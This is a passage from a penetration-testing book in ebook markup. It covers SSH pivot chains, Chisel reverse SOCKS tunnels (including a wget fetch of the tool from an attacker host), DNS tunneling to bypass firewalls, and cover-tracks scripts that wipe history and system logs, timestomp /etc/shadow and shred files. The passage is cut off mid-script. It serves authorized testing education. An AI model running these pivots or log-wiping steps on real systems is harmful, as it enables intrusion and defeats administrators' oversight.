   <h2 id="_idParaDest-199">
    <a id="_idTextAnchor422">
    </a>
    <span class="koboSpan" id="kobo.758.1">
     Dynamic chain pivoting
    </span>
   </h2>
   <p>
    <strong class="bold">
     <span class="koboSpan" id="kobo.759.1">
      Dynamic chain pivoting
     </span>
    </strong>
    <span class="koboSpan" id="kobo.760.1">
     involves
    </span>
    <a id="_idIndexMarker782">
    </a>
    <span class="koboSpan" id="kobo.761.1">
     creating a series of interconnected pivots to reach deeper into a network.
    </span>
    <span class="koboSpan" id="kobo.761.2">
     This technique is particularly useful when you’re dealing with segmented networks or when you need to bypass multiple layers
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.762.1">
      of security.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.763.1">
     Here’s a Bash script that automates the process of setting up a dynamic pivot chain.
    </span>
    <span class="koboSpan" id="kobo.763.2">
     You can find this script in this chapter’s GitHub
    </span>
    <a id="_idTextAnchor423">
    </a>
    <a id="_idTextAnchor424">
    </a>
    <span class="koboSpan" id="kobo.764.1">
     repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.765.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.766.1">
       ch12_dynamic_pivot.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.767.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.768.1">
#!/usr/bin/env bash
pivot_hosts=("user-1@192.168.5.150" "user-2@10.1.0.50" "user-3@172.16.1.25")
target="user-4@192.168.20.200"
local_port=9090
# Set up the chain
for ((i=0; i&lt;${#pivot_hosts[@]}; i++)); do
    next_port=$((local_port + i + 1))
    if [ $i -eq 0 ]; then
        ssh -f -N -L ${local_port}:localhost:${next_port} ${pivot_hosts[$i]}
    elif [ $i -eq $((${#pivot_hosts[@]} - 1)) ]; then
        ssh -f -N -L ${next_port}:${target%@*}:22 ${pivot_hosts[$i]}
    else
        ssh -f -N -L ${next_port}:localhost:$((next_port + 1)) ${pivot_hosts[$i]}
    fi
done
echo "[+] Pivot chain is established! </span><span class="koboSpan" id="kobo.768.2">Connect to ${target} via: ssh -p ${local_port} ${target#*@}"</span></pre>
   <p>
    <span class="koboSpan" id="kobo.769.1">
     Run this script on the attacker machine.
    </span>
    <span class="koboSpan" id="kobo.769.2">
     This script sets up a chain of SSH tunnels through multiple pivot hosts.
    </span>
    <span class="koboSpan" id="kobo.769.3">
     It starts by creating a local port forward on the attacker machine, then chains
    </span>
    <a id="_idIndexMarker783">
    </a>
    <span class="koboSpan" id="kobo.770.1">
     through each pivot host, ultimately reaching the target.
    </span>
    <span class="koboSpan" id="kobo.770.2">
     The script uses a loop to create each link in the chain, with special handling for the first and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.771.1">
      last pivots.
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.772.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.773.1">
     SSH provides an easier way to do the same thing using jump hosts.
    </span>
    <span class="koboSpan" id="kobo.773.2">
     The syntax of the SSH command to use multiple jump hosts is
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.774.1">
      ssh -J
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.775.1">
       user1@jumphost1,user2@jumphost2 user3@targethost
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.776.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.777.1">
     Dynamic chain pivoting can
    </span>
    <a id="_idIndexMarker784">
    </a>
    <span class="koboSpan" id="kobo.778.1">
     be performed without SSH access using external tools.
    </span>
    <span class="koboSpan" id="kobo.778.2">
     Two related tools are
    </span>
    <a id="_idIndexMarker785">
    </a>
    <span class="koboSpan" id="kobo.779.1">
     Chisel (
    </span>
    <a href="https://github.com/jpillora/chisel">
     <span class="koboSpan" id="kobo.780.1">
      https://github.com/jpillora/chisel
     </span>
    </a>
    <span class="koboSpan" id="kobo.781.1">
     ) and Ligolo-ng (
    </span>
    <a href="https://github.com/nicocha30/ligolo-ng">
     <span class="koboSpan" id="kobo.782.1">
      https://github.com/nicocha30/ligolo-ng
     </span>
    </a>
    <span class="koboSpan" id="kobo.783.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.783.2">
     These
    </span>
    <a id="_idIndexMarker786">
    </a>
    <span class="koboSpan" id="kobo.784.1">
     tools can be used in situations where you don’t have an SSH server to pivot through.
    </span>
    <span class="koboSpan" id="kobo.784.2">
     They require you to upload a single executable to the pivot host and don’t require root privileges
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.785.1">
      to operate.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.786.1">
     I’ll be using Chisel in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.787.1">
      this example.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.788.1">
     Making a note of my Kali system’s current IP address, I’ll start an HTTP server to transfer Chisel over to the target by entering the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.789.1">
      python3 -m http.server
     </span>
    </strong>
    <span class="koboSpan" id="kobo.790.1">
     command in the same directory where I’ve
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.791.1">
      downloaded Chisel.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.792.1">
     On the target system where I have a shell as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.793.1">
      user6
     </span>
    </strong>
    <span class="koboSpan" id="kobo.794.1">
     , I’ll download the Chisel file in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.795.1">
      /tmp
     </span>
    </strong>
    <span class="koboSpan" id="kobo.796.1">
     directory using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.797.1">
      wget
     </span>
    </strong>
    <a href="http://10.0.0.66:8000/chisel">
     <span class="koboSpan" id="kobo.798.1">
      http://10.0.0.66:8000/chisel
     </span>
    </a>
    <span class="koboSpan" id="kobo.799.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.799.2">
     You must make it executable before you can run it using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.800.1">
      chmod +x chisel
     </span>
    </strong>
    <span class="koboSpan" id="kobo.801.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.801.2">
     You must also run the same command on Kali because you’ll need to run Chisel on both ends of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.802.1">
      the connection.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.803.1">
     Next, start Chisel on Kali using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.804.1">
      ./chisel server -p 8001 –reverse
     </span>
    </strong>
    <span class="koboSpan" id="kobo.805.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.805.2">
     Then, on the target (pivot) system, run the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.806.1">
      ./chisel client 10.0.0.66:8001 R:1080:socks
     </span>
    </strong>
    <span class="koboSpan" id="kobo.807.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.807.2">
     Ensure that you replace the IP address with your own
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.808.1">
      as appropriate.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.809.1">
     Let’s see this in action.
    </span>
    <span class="koboSpan" id="kobo.809.2">
     In the following screenshots, Kali has an IP address of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.810.1">
      10.0.0.66
     </span>
    </strong>
    <span class="koboSpan" id="kobo.811.1">
     .
    </span>
    <span class="koboSpan" id="kobo.811.2">
     The firewall at
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.812.1">
      10.0.0.149
     </span>
    </strong>
    <span class="koboSpan" id="kobo.813.1">
     has exposed a web server on port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.814.1">
      80
     </span>
    </strong>
    <span class="koboSpan" id="kobo.815.1">
     .
    </span>
    <span class="koboSpan" id="kobo.815.2">
     This web server is hosted at
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.816.1">
      10.1.1.103
     </span>
    </strong>
    <span class="koboSpan" id="kobo.817.1">
     on the other side of the firewall.
    </span>
    <span class="koboSpan" id="kobo.817.2">
     I’ll use the Chisel SOCKS proxy to scan a Windows host on the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.818.1">
      10.1.1.0/24
     </span>
    </strong>
    <span class="koboSpan" id="kobo.819.1">
     network, on the other side of the firewall
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.820.1">
      from Kali.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.821.1">
     The following figure shows using Python to transfer the Chisel file before running the command to start the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.822.1">
      Chisel server:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer185">
     <span class="koboSpan" id="kobo.823.1">
      <img alt="Figure 12.12: Chisel is served to the pivot target from Kali and the server side is started" src="image/B22229_12_12.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.824.1">
     Figure 12.12: Chisel is served to the pivot target from Kali and the server side is started
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.825.1">
     The following figure
    </span>
    <a id="_idIndexMarker787">
    </a>
    <span class="koboSpan" id="kobo.826.1">
     demonstrates the commands that have been run on the target to transfer Chisel and start the client side of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.827.1">
      the connection:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer186">
     <span class="koboSpan" id="kobo.828.1">
      <img alt="Figure 12.13: Chisel is started on the pivot host in client mode, completing the reverse SOCKS connection" src="image/B22229_12_13.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.829.1">
     Figure 12.13: Chisel is started on the pivot host in client mode, completing the reverse SOCKS connection
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.830.1">
     With the connection established, we can use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.831.1">
      proxychains
     </span>
    </strong>
    <span class="koboSpan" id="kobo.832.1">
     to scan through the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.833.1">
       SOCKS
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.834.1">
      tunnel:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer187">
     <span class="koboSpan" id="kobo.835.1">
      <img alt="Figure 12.14: Kali scans a Windows host through the SOCKS proxy" src="image/B22229_12_14.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.836.1">
     Figure 12.14: Kali scans a Windows host through the SOCKS proxy
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.837.1">
     We’ve only scratched the
    </span>
    <a id="_idIndexMarker788">
    </a>
    <span class="koboSpan" id="kobo.838.1">
     surface of Chisel’s capabilities.
    </span>
    <span class="koboSpan" id="kobo.838.2">
     You can use Chisel to pivot through multiple hops into
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.839.1">
      a network.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.840.1">
     Ligolo-ng works differently.
    </span>
    <span class="koboSpan" id="kobo.840.2">
     Instead of creating a SOCKS proxy, it creates a userland network stack that works much like a VPN connection to route network traffic through a tunnel.
    </span>
    <span class="koboSpan" id="kobo.840.3">
     You can find the tool, documentation, and command examples
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.841.1">
      at
     </span>
    </span>
    <a href="https://github.com/Nicocha30/ligolo-ng">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.842.1">
       https://github.com/Nicocha30/ligolo-ng
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.843.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.844.1">
     In some cases, you may not be able to establish outbound connections from an internal network to the Internet.
    </span>
    <span class="koboSpan" id="kobo.844.2">
     In the next section, we’ll explore
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.845.1">
      DNS tunneling
     </span>
    </strong>
    <span class="koboSpan" id="kobo.846.1">
     as a slower yet dependable
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.847.1">
      pivot technique.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-200">
    <a id="_idTextAnchor425">
    </a>
    <span class="koboSpan" id="kobo.848.1">
     DNS tunneling
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.849.1">
     DNS tunneling can
    </span>
    <a id="_idIndexMarker789">
    </a>
    <span class="koboSpan" id="kobo.850.1">
     be used to bypass firewalls and establish a covert channel for pivoting.
    </span>
    <span class="koboSpan" id="kobo.850.2">
     I’ve used this technique when plugging miniature computers such as a Raspberry Pi into a network port to establish a covert tunnel out of restricted networks when outbound SSH or Wireguard connections were blocked.
    </span>
    <span class="koboSpan" id="kobo.850.3">
     I’ve also used DNS tunneling as a failover for remote testing devices sent to client sites.
    </span>
    <span class="koboSpan" id="kobo.850.4">
     If network restrictions prevented the testing device from connecting back to me, I can still establish a connection via the DNS tunnel and complete
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.851.1">
      the pentest.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.852.1">
     I’ve found that it may be difficult for some to understand how DNS tunneling works and you may assume that if port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.853.1">
      53
     </span>
    </strong>
    <span class="koboSpan" id="kobo.854.1">
     outbound to the internet is blocked, then you’re blocking DNS tunneling.
    </span>
    <span class="koboSpan" id="kobo.854.2">
     That is simply
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.855.1">
      not true.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.856.1">
     Here’s a step-by-step breakdown of how
    </span>
    <a id="_idIndexMarker790">
    </a>
    <span class="koboSpan" id="kobo.857.1">
     DNS tunneling
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.858.1">
      typically works:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.859.1">
      The client, which is the device attempting to bypass network restrictions, creates a DNS query that contains encoded data as the subdomain name.
     </span>
     <span class="koboSpan" id="kobo.859.2">
      This data might be part of a command, file, or other information that needs to be sent to an external server.
     </span>
     <span class="koboSpan" id="kobo.859.3">
      The query is typically for a subdomain of a domain that’s controlled by the attacker or the legitimate service using
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.860.1">
       DNS tunneling.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.861.1">
      The client’s DNS query is sent to the DNS server that’s been configured for the network interface.
     </span>
     <span class="koboSpan" id="kobo.861.2">
      The network DNS server can’t resolve the subdomain, so it forwards the request to the authoritative DNS server for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.862.1">
       the domain.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.863.1">
      The DNS query traverses the normal DNS resolution process, eventually reaching an authoritative DNS server controlled by
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.864.1">
       the attacker.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.865.1">
      This server is configured to understand the encoded data within the DNS query.
     </span>
     <span class="koboSpan" id="kobo.865.2">
      The authoritative DNS server decodes the data from the query, processes it (that is, executes a command), and then encodes a response within a
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.866.1">
       DNS reply.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.867.1">
      The response is sent back to the client in the form of a DNS response, which appears to be a regular DNS response to any network
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.868.1">
       monitoring system.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.869.1">
      The client receives the DNS response and decodes the data.
     </span>
     <span class="koboSpan" id="kobo.869.2">
      This could be an acknowledgment, a piece of a file being exfiltrated, or a response to a command that was
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.870.1">
       sent earlier.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.871.1">
      The process
     </span>
     <a id="_idIndexMarker791">
     </a>
     <span class="koboSpan" id="kobo.872.1">
      repeats as necessary, with the client and server continuing to communicate covertly via DNS queries
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.873.1">
       and responses.
      </span>
     </span>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.874.1">
     All except the most locked-down networks are going to forward requests for subdomains that can’t be resolved from the internal network DNS server to the authoritative server for the domain.
    </span>
    <span class="koboSpan" id="kobo.874.2">
     This means that if you have to tunnel out of a network that requires all outbound network traffic to either be allowed with a firewall rule or otherwise must go through an HTTP/S proxy, you can bypass these network restrictions by utilizing DNS tunneling.
    </span>
    <span class="koboSpan" id="kobo.874.3">
     It’s slow, hence why DNS tunneling is normally used as a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.875.1">
      last resort.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.876.1">
     To use this technique, you’ll need to set up an
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.877.1">
      iodined
     </span>
    </strong>
    <span class="koboSpan" id="kobo.878.1">
     server
    </span>
    <a id="_idIndexMarker792">
    </a>
    <span class="koboSpan" id="kobo.879.1">
     on a host that’s been exposed to the internet and ensure that it’s authoritative for the domain you’re using
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.880.1">
      for tunneling.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.881.1">
     See the iodined project documentation
    </span>
    <a id="_idIndexMarker793">
    </a>
    <span class="koboSpan" id="kobo.882.1">
     for configuration and execution
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.883.1">
      instructions:
     </span>
    </span>
    <a href="https://github.com/yarrick/iodine">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.884.1">
       https://github.com/yarrick/iodine
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.885.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.886.1">
     Be aware that a DNS tunnel is plaintext or unencrypted communications.
    </span>
    <span class="koboSpan" id="kobo.886.2">
     Be sure to encrypt traffic through the tunnel.
    </span>
    <span class="koboSpan" id="kobo.886.3">
     When used to communicate with a small drop box or remote testing device, I establish an SSH session through the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.887.1">
      DNS tunnel.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.888.1">
     This concludes our discussion on pivoting.
    </span>
    <span class="koboSpan" id="kobo.888.2">
     At this point, you’ve learned how to use SSH and external tools to establish forward and reverse pivot tunnels, from basic through advanced scenarios.
    </span>
    <span class="koboSpan" id="kobo.888.3">
     In the next section, we’ll discuss cleaning up and covering our
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.889.1">
      tracks post-exploitation.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-201">
    <a id="_idTextAnchor426">
    </a>
    <span class="koboSpan" id="kobo.890.1">
     Cleanup and covering tracks
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.891.1">
     In pentesting, it’s essential to clean up after completing your assessment.
    </span>
    <span class="koboSpan" id="kobo.891.2">
     This process involves removing any artifacts, logs, or traces that might indicate your presence on the system.
    </span>
    <span class="koboSpan" id="kobo.891.3">
     This section covers various techniques you can use to clean up and cover your tracks using
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.892.1">
      Bash scripting.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.893.1">
     One of the first steps in
    </span>
    <a id="_idIndexMarker794">
    </a>
    <span class="koboSpan" id="kobo.894.1">
     cleaning up is to clear the command history.
    </span>
    <span class="koboSpan" id="kobo.894.2">
     This prevents the system administrator from seeing the commands
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.895.1">
      you’ve executed.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.896.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.897.1">
      history
     </span>
    </strong>
    <span class="koboSpan" id="kobo.898.1">
     command will clear and write an empty command history – that is,
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.899.1">
       history -cw
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.900.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.901.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.902.1">
      history -c
     </span>
    </strong>
    <span class="koboSpan" id="kobo.903.1">
     command clears the current session’s history from memory, while the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.904.1">
      history -w
     </span>
    </strong>
    <span class="koboSpan" id="kobo.905.1">
     command writes the (now empty) history to the history file, effectively erasing the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.906.1">
      previous contents.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.907.1">
     Deleting the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.908.1">
      ~/.bash_history
     </span>
    </strong>
    <span class="koboSpan" id="kobo.909.1">
     file doesn’t clear the history because ending your current session will cause all commands that were entered during the session to be written to the recreated file
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.910.1">
      on exit.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.911.1">
     You can also prevent any command history from being recorded by setting the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.912.1">
      HISTFILE
     </span>
    </strong>
    <span class="koboSpan" id="kobo.913.1">
     environment variable to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.914.1">
      /dev/null
     </span>
    </strong>
    <span class="koboSpan" id="kobo.915.1">
     at the start of a Bash session using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.916.1">
      set
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.917.1">
       HISTFILE=/dev/null
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.918.1">
      command.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.919.1">
     System logs often contain
    </span>
    <a id="_idIndexMarker795">
    </a>
    <span class="koboSpan" id="kobo.920.1">
     evidence of your activities.
    </span>
    <span class="koboSpan" id="kobo.920.2">
     Here’s a script you can use to clear common log files.
    </span>
    <span class="koboSpan" id="kobo.920.3">
     You can find it in this chap
    </span>
    <a id="_idTextAnchor427">
    </a>
    <a id="_idTextAnchor428">
    </a>
    <span class="koboSpan" id="kobo.921.1">
     ter’s GitHub repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.922.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.923.1">
       ch12_clear_logs.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.924.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.925.1">
#!/usr/bin/env bash
log_files=(
    "/var/log/auth.log"
    "/var/log/syslog"
    "/var/log/messages"
    "/var/log/secure"
)
for file in "${log_files[@]}"; do
    if [ -f "$file" ]; then
        echo "" &gt; "$file"
        echo "Cleared $file"
    else
        echo "$file not found"
    fi
done</span></pre>
   <p>
    <span class="koboSpan" id="kobo.926.1">
     This script iterates through an array of common log files.
    </span>
    <span class="koboSpan" id="kobo.926.2">
     For each file that exists, it overwrites the contents with an empty string, effectively clearing the log.
    </span>
    <span class="koboSpan" id="kobo.926.3">
     Of course, it requires root access to clear
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.927.1">
      these files.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.928.1">
     To make your activities less obvious, you can modify the timestamps of files you’ve accessed or modified.
    </span>
    <span class="koboSpan" id="kobo.928.2">
     The following script will modify an array of files by changing the timestamp so that it matches the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.929.1">
      /etc/hosts
     </span>
    </strong>
    <span class="koboSpan" id="kobo.930.1">
     file.
    </span>
    <span class="koboSpan" id="kobo.930.2">
     You can find it in this chap
    </span>
    <a id="_idTextAnchor429">
    </a>
    <a id="_idTextAnchor430">
    </a>
    <span class="koboSpan" id="kobo.931.1">
     ter’s GitHub repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.932.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.933.1">
       ch12_timestamps.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.934.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.935.1">
#!/usr/bin/env bash
files_to_modify=(
    "/etc/passwd"
    "/etc/shadow"
    "/var/log/auth.log"
)
reference_file="/etc/hosts"
for file in "${files_to_modify[@]}"; do
    if [ -f "$file" ]; then
        touch -r "$reference_file" "$file"
        echo "Modified timestamp of $file"
    else
        echo "$file not found"
    fi
done</span></pre>
   <p>
    <span class="koboSpan" id="kobo.936.1">
     This script uses the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.937.1">
      touch
     </span>
    </strong>
    <span class="koboSpan" id="kobo.938.1">
     command with the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.939.1">
      -r
     </span>
    </strong>
    <span class="koboSpan" id="kobo.940.1">
     option to set the timestamp of each file in the list to match that of a reference file (in this
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.941.1">
      case,
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.942.1">
       /etc/hosts
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.943.1">
      ).
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.944.1">
     For sensitive files that need to be completely erased, use the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.945.1">
       shred
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.946.1">
      command:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.947.1">
shred -u -z -n 3 sensitive_file.txt</span></pre>
   <p>
    <span class="koboSpan" id="kobo.948.1">
     This command overwrites
    </span>
    <a id="_idIndexMarker796">
    </a>
    <span class="koboSpan" id="kobo.949.1">
     the file with random data three times (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.950.1">
      -n 3
     </span>
    </strong>
    <span class="koboSpan" id="kobo.951.1">
     ), then with zeros (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.952.1">
      -z
     </span>
    </strong>
    <span class="koboSpan" id="kobo.953.1">
     ), and finally removes the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.954.1">
      file (
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.955.1">
       -u
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.956.1">
      ).
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.957.1">
     If you’ve made network connections, you might want to clear the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.958.1">
      ARP cache:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.959.1">
sudo ip -s -s neigh flush all</span></pre>
   <p>
    <span class="koboSpan" id="kobo.960.1">
     This command flushes all entries from the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.961.1">
      ARP cache.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.962.1">
     Here’s a comprehensive cleanup script that combines several of these techniques.
    </span>
    <span class="koboSpan" id="kobo.962.2">
     It can be found in this
    </span>
    <a id="_idTextAnchor431">
    </a>
    <a id="_idTextAnchor432">
    </a>
    <span class="koboSpan" id="kobo.963.1">
     chapter’s GitHub repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.964.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.965.1">
       ch12_cleanup.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.966.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.967.1">
#!/usr/bin/env bash
# Clear bash history
history -c
history -w
# Clear common log files
log_files=("/var/log/auth.log" "/var/log/syslog" "/var/log/messages" "/var/log/secure")
for file in "${log_files[@]}"; do
    if [ -f "$file" ]; then
        sudo echo "" &gt; "$file"
        echo "Cleared $file"
    fi
done
# Remove temporary files
identifier="pentester123"
